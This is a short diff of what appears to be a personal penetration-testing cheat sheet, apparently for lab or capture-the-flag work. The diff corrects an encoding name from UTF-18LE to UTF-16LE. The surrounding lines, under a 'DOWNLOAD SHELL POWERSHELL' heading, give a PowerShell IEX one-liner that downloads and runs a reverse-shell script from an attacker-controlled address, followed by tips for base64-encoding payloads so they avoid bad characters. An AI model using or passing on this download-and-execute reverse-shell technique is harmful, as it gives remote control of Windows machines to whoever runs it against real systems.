@@ -42,7 +42,7 @@ DOWNLOAD SHELL POWERSHELL
 
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/reverse.ps1')  (may need to escape quotes)
 AVOID BAD CHARACTERS --> convert to windows file format
-iconv -t UTF-18LE | base64-w0 
+iconv -t UTF-16LE | base64-w0 
 
 LINUX
 
